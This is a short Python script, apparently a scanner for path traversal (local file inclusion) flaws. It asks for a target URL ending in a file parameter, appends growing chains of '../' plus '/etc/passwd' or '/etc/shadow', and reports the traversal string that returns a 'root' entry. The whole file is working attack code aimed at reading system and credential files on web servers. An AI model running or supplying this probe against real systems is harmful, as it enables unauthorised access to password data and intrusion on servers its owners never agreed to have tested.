#!/usr/bin/env python
import requests

print('\033[91mWarning:in your target address should be a input parametr such example.com/index.php?file=\033[0m')
url = input('Enter your url: ')
payloads = {'/etc/passwd':'root','/etc/shadow':'root'}

dr = '../'
n = 0

for payload, key in payloads.items():
    for n in range(7):
        req = requests.post(url + (n*dr) + payload)
        if key in req.text:
            print('This parametr is vulnabere and attack string is \033[91m{}'.format((n*dr)+payload) + "\033[0m")
            break
        else:
            pass
